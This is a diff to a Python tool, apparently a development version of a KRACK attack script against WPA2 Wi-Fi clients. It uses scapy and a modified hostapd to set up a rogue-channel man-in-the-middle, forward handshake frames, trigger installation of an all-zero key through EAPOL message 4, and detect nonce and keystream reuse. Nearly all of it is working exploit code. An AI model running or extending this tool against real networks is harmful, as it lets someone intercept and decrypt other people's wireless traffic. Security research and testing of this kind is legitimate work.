@@ -10,6 +10,8 @@ from wpaspy import Ctrl
 # - Forward frames properly from the real channel to the rogue channel so the client gets added by hostapd
 # - Option to continously send CSA beacon frames on the real channel
 #
+# - Print sequence numbers of received frames
+# - Victim client does not go through all stages. ClientState.GotMitm not set currently.
 # - Display EAPOL replay counters in _rx debug output
 # - Detect usage off all-zero key by decrypting frames (so we can miss some frames safely)
 # - Detect when all frames are sent on the reall channel, and if so, deauthenticate
@@ -297,9 +299,9 @@ class ClientState():
 
 	# TODO: Also forward when attack has failed?
 	def should_forward(self, p):
-		if self.state in [ClientState.Connecting, ClientState.GotMitm]:
+		if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
 			return Dot11Auth in p or Dot11AssoReq in p or get_eapol_msgnum(p) <= 3
-		return self.state in [ClientState.Attack_Started, ClientState.Success_Reinstalled]
+		return self.state in [ClientState.Success_Reinstalled]
 
 	def save_iv_keystream(self, iv, keystream):
 		self.keystreams[iv] = keystream
@@ -347,6 +349,10 @@ class KRAckAttack():
 	def hostapd_add_sta(self, macaddr):
 		self.hostapd_rx_mgmt(Dot11(addr1=self.apmac, addr2=macaddr, addr3=self.apmac)/Dot11Auth(seqnum=1))
 
+	def hostapd_finish_4way(self, stamac):
+		log(DEBUG, "Sent frame to hostapd: finishing 4-way handshake of %s" % stamac)
+		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
+
 	def find_beacon(self, ssid):
 		p = sniff(count=1, timeout=2, lfilter=lambda p: get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
 		if p is None or len(p) < 1: return
@@ -391,22 +397,19 @@ class KRAckAttack():
 
 		framehdr = Dot11(addr1=self.apmac, addr2=client.macaddr, addr3=self.apmac)
 
-		# 1. Clear any client state at rogue hostapd/kernel - FIXME this may cause deauths because the client is temporarily removed
-		#deauth = framehdr/Dot11Deauth()
-		#self.hostapd_rx_mgmt(deauth)
-
-		# 2. Inform hostapd/kernel of a new client to handle using magic sequence number 1337
+		# 1. Inform hostapd/kernel of a new client using magic sequence number 1337. Combined with the next association request,
+		#    this resets client state (withing temporarily removing the client - which could otherwise cause the kernel to send
+		#    Deauths in response to data sent to the rouge AP).
 		auth = framehdr/Dot11Auth(algo="open", seqnum=0x10, status=0)
 		self.hostapd_rx_mgmt(auth)
 
-		# 3. Inform hostapd of the encryption algorithm and options the client uses
+		# 2. Inform hostapd of the encryption algorithm and options the client uses
 		assoc = framehdr/client.assocreq
 		self.hostapd_rx_mgmt(assoc)
 
-		# 4. Send the EAPOL msg4 to trigger installation of all-zero key by the modified hostapd
+		# 3. Send the EAPOL msg4 to trigger installation of all-zero key by the modified hostapd
 		msg4 = framehdr/client.msg4
-		send_dot11(self.sock_rogue, msg4)
-		# TODO XXX FIXME: Also directly forward to hostapd
+		self.hostapd_finish_4way(client.macaddr)
 
 		return True
 
@@ -553,6 +556,9 @@ class KRAckAttack():
 						if keystream == client.get_keystream(iv):
 							log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
 							client.update_state(ClientState.Success_Reinstalled)
+	
+							# TODO: Test this case
+							send_dot11(self.sock_real, client.msg4)
 
 						# Otherwise the client likely installed a new key, i.e., probably an all-zero key
 						else:
